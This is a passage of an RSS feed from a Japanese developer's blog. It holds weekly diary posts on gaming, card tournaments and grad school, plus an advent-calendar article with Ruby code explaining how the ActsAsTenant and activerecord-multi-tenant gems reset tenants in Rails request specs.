&lt;li>&lt;a href="https://kawasaki-bravethunders.com/thunderscourt/">https://kawasaki-bravethunders.com/thunderscourt/&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>FallGuys&lt;/p>
&lt;ul>
&lt;li>明日給与発生FallGuysするので見て&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">明日業務フォールガイズ行うのでご視聴お願いします！！！頭にM◯Gのカード刺さっとる！ &lt;a href="https://t.co/LtZjF5KkYL">https://t.co/LtZjF5KkYL&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1604422289847508992?ref_src=twsrc%5Etfw">December 18, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script></description></item><item><title>週報2022-W49 チームシールド</title><link>https://qwyng.dev/posts/20221212/</link><pubDate>Mon, 12 Dec 2022 23:16:11 +0900</pubDate><guid>https://qwyng.dev/posts/20221212/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>仕事
&lt;ul>
&lt;li>最近QAとかフロントとかの方面の話を聞くことが多くて面白い。&lt;/li>
&lt;li>Reduxの状態管理ってCPU回路と似ている。&lt;/li>
&lt;li>テストの場合分けの考え方は良い自動テスト書くのに役に立ちそう&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>MTG
&lt;ul>
&lt;li>日曜日にnote placeでチームシールドに参加した。&lt;/li>
&lt;li>最終戦績は3-2だった。構築のやり方が無限にあって奥が深すぎる。&lt;/li>
&lt;li>note placeきれいで良かった。仕事する場所というよりはイベント会場という感じ。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">お待たせしました‼️&lt;br>チームシールドやるよーーーー！&lt;br>&lt;br>開催日は12月11日（日）💫&lt;br>🤖兄弟戦争🤖12パックを使っての3人1組のチーム戦🔥&lt;br>&lt;br>詳細と参加希望は以下のフォームからお願いします✨&lt;a href="https://t.co/kv5XYlnSVu">https://t.co/kv5XYlnSVu&lt;/a> &lt;a href="https://t.co/xG98DwA4Qf">pic.twitter.com/xG98DwA4Qf&lt;/a>&lt;/p>&amp;mdash; はまさん＠はま屋 (@ziguyan) &lt;a href="https://twitter.com/ziguyan/status/1597501370734899202?ref_src=twsrc%5Etfw">November 29, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;ul>
&lt;li>シズラー会
&lt;ul>
&lt;li>シズラー会とはG社関係者がシズラーを食べる会である。&lt;/li>
&lt;li>最近ビーフカレーの美味しさに気づいた。&lt;/li>
&lt;li>トマホークステーキはボリュームがすごいので注文した方がいい。&lt;/li>
&lt;li>食後ははちみつティーが板。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="なんか書いとけ欄">なんか書いとけ欄
&lt;span>&lt;a href="#%e3%81%aa%e3%82%93%e3%81%8b%e6%9b%b8%e3%81%84%e3%81%a8%e3%81%91%e6%ac%84">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>バスケットボールを買った。
&lt;ul>
&lt;li>社のバスケ部で使った。&lt;/li>
&lt;li>当然NIKEのT1カラー。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>最強の哲学入門を読み終えた。
&lt;ul>
&lt;li>面白かったので東洋版も買おうと思う。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>CI環境の整備がよくわからんので&lt;a href="https://book.impress.co.jp/books/1120101031">Dockerコンテナ開発・環境構築の基本&lt;/a>を買った
&lt;ul>
&lt;li>CI時のイメージビルドとキャッシュがよくわからんのでやっていきたい&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>Railsでよく使用されるマルチテナントGemのテナントの初期化について</title><link>https://qwyng.dev/posts/shr_advent_calendar2022/</link><pubDate>Wed, 07 Dec 2022 00:00:00 +0000</pubDate><guid>https://qwyng.dev/posts/shr_advent_calendar2022/</guid><description>&lt;p>このエントリは、&lt;a href="https://qiita.com/advent-calendar/2022/smarthr">SmartHR Advent Calendar 2022&lt;/a>の7日目です。&lt;/p>
&lt;p>SmartHRではマルチテナントの実現のために &lt;a href="https://github.com/citusdata/activerecord-multi-tenant">activerecord-multi-tenant&lt;/a>というGemを使っているのですが、そのGemを調査したときに気づいたことを書きたいと思います。&lt;/p>
&lt;h3 id="tldr">TL;DR
&lt;span>&lt;a href="#tldr">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>&lt;code>activerecord-multi-tenant&lt;/code>と&lt;code>ActsAsTenant&lt;/code>はリクエストごとにテナントを初期化するタイミングが違うよ。&lt;/li>
&lt;li>とくにrequest specでは誤ったテストの原因になりかねないので、テナントが初期化されるタイミングを理解して実際のアプリケーションの動作になるだけ近づけよう。&lt;/li>
&lt;/ul>
&lt;h3 id="テナントのリセットタイミングの再現コード">テナントのリセットタイミングの再現コード
&lt;span>&lt;a href="#%e3%83%86%e3%83%8a%e3%83%b3%e3%83%88%e3%81%ae%e3%83%aa%e3%82%bb%e3%83%83%e3%83%88%e3%82%bf%e3%82%a4%e3%83%9f%e3%83%b3%e3%82%b0%e3%81%ae%e5%86%8d%e7%8f%be%e3%82%b3%e3%83%bc%e3%83%89">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>Railsにおいてマルチテナントを行う際に有力な選択肢として&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/ErwinM/acts_as_tenant">ActsAsTenant&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/citusdata/activerecord-multi-tenant">activerecord-multi-tenant&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>あたりが有力な選択肢になるかと思われます。
（&lt;a href="https://github.com/rails-on-services/apartment">Apartment&lt;/a>も有名ですが先述の２つのGemと異なりマルチスキーマでマルチテナントを構成するGemで検証が間に合わなかったので言及しません :bow: )&lt;br>
どちらのGemもリクエストごとに設定されているテナントを初期化してくれる機能が提供されていますが、その初期化をするタイミングが微妙に異なっています。&lt;br>
↓サンプルコードです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ruby" data-lang="ruby">require &lt;span style="color:#e6db74">&amp;#39;bundler/inline&amp;#39;&lt;/span>
gemfile(&lt;span style="color:#66d9ef">true&lt;/span>) &lt;span style="color:#66d9ef">do&lt;/span>
source &lt;span style="color:#e6db74">&amp;#39;https://rubygems.org&amp;#39;&lt;/span>
gem &lt;span style="color:#e6db74">&amp;#39;rails&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;7.0.4&amp;#39;&lt;/span>
gem &lt;span style="color:#e6db74">&amp;#39;sqlite3&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1.5.4&amp;#39;&lt;/span>
gem &lt;span style="color:#e6db74">&amp;#39;activerecord-multi-tenant&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;2.1.6&amp;#39;&lt;/span>, require: &lt;span style="color:#66d9ef">false&lt;/span>
gem &lt;span style="color:#e6db74">&amp;#39;acts_as_tenant&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;0.5.3&amp;#39;&lt;/span>
gem &lt;span style="color:#e6db74">&amp;#39;rspec-rails&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
require &lt;span style="color:#e6db74">&amp;#39;action_controller/railtie&amp;#39;&lt;/span>
require &lt;span style="color:#e6db74">&amp;#39;active_record&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">ActiveRecord&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">Base&lt;/span>&lt;span style="color:#f92672">.&lt;/span>establish_connection(&lt;span style="color:#e6db74">adapter&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;sqlite3&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">database&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;:memory:&amp;#39;&lt;/span>)
require &lt;span style="color:#e6db74">&amp;#39;activerecord-multi-tenant&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">App&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#66d9ef">Rails&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">Application&lt;/span>
routes&lt;span style="color:#f92672">.&lt;/span>append &lt;span style="color:#66d9ef">do&lt;/span>
get &lt;span style="color:#e6db74">&amp;#39;/tenant_test&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;tenant#test&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TenantController&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#66d9ef">ActionController&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">API&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>
puts &lt;span style="color:#e6db74">&amp;#34;ActsAsTenant.current_tenant: &lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>&lt;span style="color:#66d9ef">ActsAsTenant&lt;/span>&lt;span style="color:#f92672">.&lt;/span>current_tenant&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
puts &lt;span style="color:#e6db74">&amp;#34;ActsAsTenant.test_tenant: &lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>&lt;span style="color:#66d9ef">ActsAsTenant&lt;/span>&lt;span style="color:#f92672">.&lt;/span>test_tenant&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
puts &lt;span style="color:#e6db74">&amp;#34;MultiTenant.current_tenant: &lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>&lt;span style="color:#66d9ef">MultiTenant&lt;/span>&lt;span style="color:#f92672">.&lt;/span>current_tenant&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
render &lt;span style="color:#e6db74">json&lt;/span>: { &lt;span style="color:#e6db74">hello&lt;/span>: &lt;span style="color:#e6db74">:world&lt;/span> }
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">App&lt;/span>&lt;span style="color:#f92672">.&lt;/span>configure &lt;span style="color:#66d9ef">do&lt;/span>
config&lt;span style="color:#f92672">.&lt;/span>hosts&lt;span style="color:#f92672">.&lt;/span>clear
&lt;span style="color:#66d9ef">end&lt;/span>
require &lt;span style="color:#e6db74">&amp;#39;acts_as_tenant/test_tenant_middleware&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">Rails&lt;/span>&lt;span style="color:#f92672">.&lt;/span>application&lt;span style="color:#f92672">.&lt;/span>configure &lt;span style="color:#66d9ef">do&lt;/span>
config&lt;span style="color:#f92672">.&lt;/span>middleware&lt;span style="color:#f92672">.&lt;/span>use &lt;span style="color:#66d9ef">ActsAsTenant&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">TestTenantMiddleware&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">App&lt;/span>&lt;span style="color:#f92672">.&lt;/span>initialize!
require &lt;span style="color:#e6db74">&amp;#39;rspec/rails&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">RSpec&lt;/span>&lt;span style="color:#f92672">.&lt;/span>describe &lt;span style="color:#e6db74">&amp;#39;Test&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">type&lt;/span>: &lt;span style="color:#e6db74">:request&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
it &lt;span style="color:#e6db74">&amp;#39;first request&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;span style="color:#66d9ef">ActsAsTenant&lt;/span>&lt;span style="color:#f92672">.&lt;/span>current_tenant &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Tenant set in spec&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">ActsAsTenant&lt;/span>&lt;span style="color:#f92672">.&lt;/span>test_tenant &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Tenant set in spec&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">MultiTenant&lt;/span>&lt;span style="color:#f92672">.&lt;/span>current_tenant &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Tenant set in spec&amp;#39;&lt;/span>
get &lt;span style="color:#e6db74">&amp;#39;/tenant_test&amp;#39;&lt;/span>
expect(response&lt;span style="color:#f92672">.&lt;/span>status)&lt;span style="color:#f92672">.&lt;/span>to eq(&lt;span style="color:#ae81ff">200&lt;/span>)
&lt;span style="color:#66d9ef">end&lt;/span>
it &lt;span style="color:#e6db74">&amp;#39;second request&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
get &lt;span style="color:#e6db74">&amp;#39;/tenant_test&amp;#39;&lt;/span>
expect(response&lt;span style="color:#f92672">.&lt;/span>status)&lt;span style="color:#f92672">.&lt;/span>to eq(&lt;span style="color:#ae81ff">200&lt;/span>)
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>実行結果&lt;/p>
&lt;pre tabindex="0">&lt;code>⋊&amp;gt; ~/acts_as_tenant_sandbox rspec -f d script.rb
Fetching gem metadata from https://rubygems.org/...........
###(中略)###
Test
ActsAsTenant.current_tenant: Tenant set in spec
ActsAsTenant.test_tenant:
MultiTenant.current_tenant:
first request
ActsAsTenant.current_tenant:
ActsAsTenant.test_tenant:
MultiTenant.current_tenant:
second request
Finished in 0.00789 seconds (files took 1.34 seconds to load)
2 examples, 0 failures
&lt;/code>&lt;/pre>&lt;p>実行結果からわかる通り&lt;code>ActsAsTenant.current_tenant&lt;/code>はテストコード内で設定したテナントがrequest specの機能で呼び出されたアプリケーションの中でも初期化されずに引き継がれていることがわかります。
この問題(？)については&lt;code>ActsAsTenant&lt;/code>のREADMEにて記載があります。&lt;/p>
&lt;blockquote>
&lt;p>If you set the &lt;code>current_tenant&lt;/code> in your tests, make sure to clean up the tenant after each test by calling &lt;code>ActsAsTenant.current_tenant = nil&lt;/code>. Integration tests are more difficult: manually setting the &lt;code>current_tenant&lt;/code> value will not survive across multiple requests, even if they take place within the same test. This can result in undesired boilerplate to set the desired tenant. Moreover, the efficacy of the test can be compromised because the set &lt;code>current_tenant&lt;/code> value will carry over into the request-response cycle.&lt;/p>
&lt;/blockquote>
&lt;p>また対処の方法としてサンプルコードでも使用していた&lt;code>ActsAsTenant.test_tenant&lt;/code>の使用を推奨する記載もREADMEにあります。&lt;/p>
&lt;h3 id="なぜ初期化するタイミングが違うのか">なぜ初期化するタイミングが違うのか
&lt;span>&lt;a href="#%e3%81%aa%e3%81%9c%e5%88%9d%e6%9c%9f%e5%8c%96%e3%81%99%e3%82%8b%e3%82%bf%e3%82%a4%e3%83%9f%e3%83%b3%e3%82%b0%e3%81%8c%e9%81%95%e3%81%86%e3%81%ae%e3%81%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>なぜ初期化するタイミングが違うのかというと&lt;code>ActsAsTenant&lt;/code>と&lt;code>MultiTenant&lt;/code>ではテナントの保存に使用しているクラスが異なっているからです。&lt;/p>
&lt;p>&lt;code>ActsAsTenant&lt;/code>は&lt;code>RequestStore&lt;/code>を&lt;a href="https://github.com/ErwinM/acts_as_tenant/blob/v0.5.3/lib/acts_as_tenant.rb#L59">使っています。&lt;/a>&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/steveklabnik/request_store">https://github.com/steveklabnik/request_store&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>対して&lt;code>MultiTenant&lt;/code>は&lt;code>ActiveSupport::CurrentAttributes&lt;/code>を&lt;a href="https://github.com/citusdata/activerecord-multi-tenant/blob/a6c8c2d75230ac6ebb22a609d6f7fc57e5f250ee/lib/activerecord-multi-tenant/multi_tenant.rb#L60">使っています。&lt;/a>&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/rails/rails/blob/v7.0.4/activesupport/lib/active_support/current_attributes.rb">https://github.com/rails/rails/blob/v7.0.4/activesupport/lib/active_support/current_attributes.rb&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>どちらもThreadクラスを利用しつつリクエストごとに値を初期化してくれる場所を提供してくれるクラスですが、初期化を設定する方法が異なっています。&lt;/p>
&lt;p>&lt;code>RequestStore&lt;/code>はRackに&lt;a href="https://github.com/steveklabnik/request_store/blob/v1.5.1/lib/request_store/middleware.rb">値を初期化するミドルウェア&lt;/a>を追加しているのと、RailsのExecuterの&lt;code>to_complite&lt;/code>コールバックに&lt;a href="https://github.com/steveklabnik/request_store/blob/f79bd375e88f434428b876dbb5c8a51b569712aa/lib/request_store/railtie.rb#L10">値を初期化する動作が追加&lt;/a> されています。&lt;br>
Executerのコールバックについての細かい解説は&lt;a href="https://railsguides.jp/threading_and_code_execution.html#executor">Railsガイド&lt;/a>にあります（いつもありがとうございます！）。&lt;/p>
&lt;p>ミドルウェアの中身は↓のようになっており、&lt;code>RequestStore&lt;/code>はリクエストを処理した後にのみ値を初期化していることがわかります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">call&lt;/span>(env)
&lt;span style="color:#66d9ef">RequestStore&lt;/span>&lt;span style="color:#f92672">.&lt;/span>begin!
status, headers, body &lt;span style="color:#f92672">=&lt;/span> @app&lt;span style="color:#f92672">.&lt;/span>call(env)
body &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">Rack&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">BodyProxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>new(body) &lt;span style="color:#66d9ef">do&lt;/span>
&lt;span style="color:#66d9ef">RequestStore&lt;/span>&lt;span style="color:#f92672">.&lt;/span>end!
&lt;span style="color:#66d9ef">RequestStore&lt;/span>&lt;span style="color:#f92672">.&lt;/span>clear!
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#f92672">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>対して&lt;code>ActiveSupport::CurrentAttributes&lt;/code>ではRails のExecutorのコールバックである&lt;code>to_run&lt;/code>と&lt;code>to_complete&lt;/code>に&lt;a href="https://github.com/rails/rails/blob/v7.0.4/activesupport/lib/active_support/railtie.rb#L41">値を初期化する動作を追加しています。&lt;/a>&lt;br>
先述のガイドにものっていますが、&lt;code>to_run&lt;/code>コールバックはアプリケーションの実行前に呼び出されるコールバックです。&lt;/p>
&lt;p>↓は超ざっくりイメージです。
&lt;img src="https://qwyng.dev/reset.png" alt="">&lt;/p>
&lt;h3 id="初期化されるタイミングの違いで起こりうること">初期化されるタイミングの違いで起こりうること
&lt;span>&lt;a href="#%e5%88%9d%e6%9c%9f%e5%8c%96%e3%81%95%e3%82%8c%e3%82%8b%e3%82%bf%e3%82%a4%e3%83%9f%e3%83%b3%e3%82%b0%e3%81%ae%e9%81%95%e3%81%84%e3%81%a7%e8%b5%b7%e3%81%93%e3%82%8a%e3%81%86%e3%82%8b%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>request specで使えるようになる&lt;code>get&lt;/code>等のメソッドはテストと同じスレッドで擬似的にRackアプリ全体を呼び出すため、&lt;code>RequestStore&lt;/code>を使用している&lt;code>ActsAsTenant.current_tenant&lt;/code>はテスト内で設定した&lt;code>current_tenant&lt;/code>の値が初期化されずに引き継がれます。&lt;br>
request specを統合テストと考えると事前にテナントが固定されたままテストするのはあまりよくないので&lt;a href="https://github.com/ErwinM/acts_as_tenant/tree/v0.5.3#testing">リクエストを処理する前に値を初期化してくれるミドルウェアに対応している&lt;/a>&lt;code>ActsAsTenant.test_tenant&lt;/code>を使用したほうが良いでしょう。&lt;br>
実は &lt;code>activerecord-multi-tenant&lt;/code>も古いバージョンでは&lt;code>RequestStore&lt;/code>を使用しており、&lt;code>ActsAsTenant.current_tenant&lt;/code>と同様にrequest spec内で固定したテナントが&lt;code>get&lt;/code>等で呼び出すアプリケーション内で初期化されず引き継がれるようになっていました。&lt;br>
request specを書く際にはテストのためにデータを準備するコードでテナントを固定する箇所は発生すると思いますので、
テナントがスレッド内でどのように固定と初期化されているのか理解しておくことで間違ったテストを書く可能性が減らせると思います。&lt;/p></description></item><item><title>週報2022-W48 オーバーウォッチ2</title><link>https://qwyng.dev/posts/20221204/</link><pubDate>Sun, 04 Dec 2022 17:30:44 +0900</pubDate><guid>https://qwyng.dev/posts/20221204/</guid><description>&lt;h2 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>アドカレを書いた
&lt;ul>
&lt;li>担当日は12月7日だが12月3日に書き上げた。
&lt;ul>
&lt;li>偉すぎる&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>メンタルが崩壊した。
&lt;ul>
&lt;li>水曜日に私生活でなんらかの事件がありメンタルが崩壊した。
&lt;ul>
&lt;li>ので今週はほとんどゲームやってた&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>OW2のコミュニティを紹介してもらって遊びはじめた。
&lt;ul>
&lt;li>やっぱりOWはフレンドと遊ぶとまじで面白い。&lt;/li>
&lt;li>シーズン4以降あんまりやってなかったのでおじいちゃんである。
&lt;ul>
&lt;li>特にシグマのウルトが本当におじいちゃんで悲しい。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>ポケモン
&lt;ul>
&lt;li>パーティができたのでランクマッチに潜っている。&lt;/li>
&lt;li>ガッサでノオーにマッパしたら雪でBあがってて確2とれなかった。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>仕事
&lt;ul>
&lt;li>今週は水曜日の事件により全て崩壊したのでだめです。&lt;/li>
&lt;li>スプラトゥーン配信者の同僚氏とゲームの話してたことしか思い出せない。&lt;/li>
&lt;li>database_cleaner-active_recordへ立てたPRに催促いれるなどした。
&lt;ul>
&lt;li>&lt;a href="https://github.com/DatabaseCleaner/database_cleaner-active_record/pull/75">https://github.com/DatabaseCleaner/database_cleaner-active_record/pull/75&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>チルアウトとオイコスを大量に購入した&lt;/li>
&lt;/ul>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">家にチルアウトとオイコスが大量にあるタイプの人間 &lt;a href="https://t.co/8kejw0cjDK">pic.twitter.com/8kejw0cjDK&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1598244946028306433?ref_src=twsrc%5Etfw">December 1, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;ul>
&lt;li>どっちも好きでコンビニでよく買っている。
&lt;ul>
&lt;li>まとめ買いしたほうが経済的だろうということでAmazonで購入した。
&lt;ul>
&lt;li>家の冷蔵庫がパンパンになった。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>草タイプにキノコのほうしは効かない（1敗）&lt;/li>
&lt;li>ラインハルト以外やらないほうがいい
&lt;ul>
&lt;li>下手すぎて申し訳ないのでソロでしか別のキャラやらなそう&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="なんか書いとけ欄">なんか書いとけ欄
&lt;span>&lt;a href="#%e3%81%aa%e3%82%93%e3%81%8b%e6%9b%b8%e3%81%84%e3%81%a8%e3%81%91%e6%ac%84">#&lt;/a>&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>メンタルケア感謝します。
&lt;ul>
&lt;li>Life Goes onということでね。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>堀義人のポートフォリオ全人類見習ったほうがいい&lt;/li>
&lt;/ul>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">僕は、公開株を含め、信託・ETF・債権等一才の投資をしていない。当然仮想通貨もだ。理由は、株価の変動に一喜一憂したくないからだ。&lt;br>&lt;br>資産は全て自社株と自社のVCファンドへの投資のみ。元々ギャンブルが好きではないので、自分が運命をコントロールできることにしか賭けない。 &lt;a href="https://t.co/bU8voyBGaO">https://t.co/bU8voyBGaO&lt;/a>&lt;/p>&amp;mdash; 堀義人 (@YoshitoHori) &lt;a href="https://twitter.com/YoshitoHori/status/1598118912339562497?ref_src=twsrc%5Etfw">December 1, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script></description></item><item><title>週報2022-W47 四則演算ができない</title><link>https://qwyng.dev/posts/20221127/</link><pubDate>Sun, 27 Nov 2022 16:17:49 +0900</pubDate><guid>https://qwyng.dev/posts/20221127/</guid><description>&lt;h2 id="週報とは">週報とは？
&lt;span>&lt;a href="#%e9%80%b1%e5%a0%b1%e3%81%a8%e3%81%af">#&lt;/a>&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>みんなやってるので私もやります
&lt;ul>
&lt;li>みんなというのは↓の２つの記事のことである。
&lt;ul>
&lt;li>&lt;a href="https://shifumin.hatenadiary.com/entry/2022/11/06/200000">https://shifumin.hatenadiary.com/entry/2022/11/06/200000&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://log.chroju.dev/2022-1-2649042839c24aaaab5d130542ec8bf3">https://log.chroju.dev/2022-1-2649042839c24aaaab5d130542ec8bf3&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>大学院のテストを受けた
&lt;ul>
&lt;li>符号付きのビット列に対して雰囲気理解しかない&lt;/li>
&lt;li>２進数を16進数にできない&lt;/li>
&lt;li>16進数から2進数にもできない&lt;/li>
&lt;li>MIPS(CPUアーキテクチャではない）とかCPIとかの計算ができない
&lt;ul>
&lt;li>単純に自分は四則演算がちゃんとできない、速さ×時間とかそういう感じの計算が嫌すぎる。&lt;/li>
&lt;li>仕組みが脳内に入れられない、割り算の脳内イメージがめちゃくちゃな可能性がある&lt;/li>
&lt;li>２進数は流石に毎回でてくるのでなんとなくわかってきた。他の進数も同じなはずなんだよなぁ&lt;/li>
&lt;li>こんなイキフン野郎でも後5単位で論文以外の単位が揃います&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>浅草に行った。
&lt;ul>
&lt;li>隅田川最高すぎてビビった&lt;/li>
&lt;li>もんじゃOCです&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>仕事
&lt;ul>
&lt;li>なにか刷新しそうな気配を感じる&lt;/li>
&lt;li>ActiveRecordのmergeの上書きの可能性初めて知った&lt;/li>
&lt;li>↓みたいにmergeの引数のrelationに上書きされるというやつ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ruby" data-lang="ruby">irb(main):&lt;span style="color:#ae81ff">005&lt;/span>:&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>where(name: &lt;span style="color:#e6db74">&amp;#39;スレッシュ&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>merge(&lt;span style="color:#66d9ef">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>where(name: &lt;span style="color:#e6db74">&amp;#39;アリスター&amp;#39;&lt;/span>))
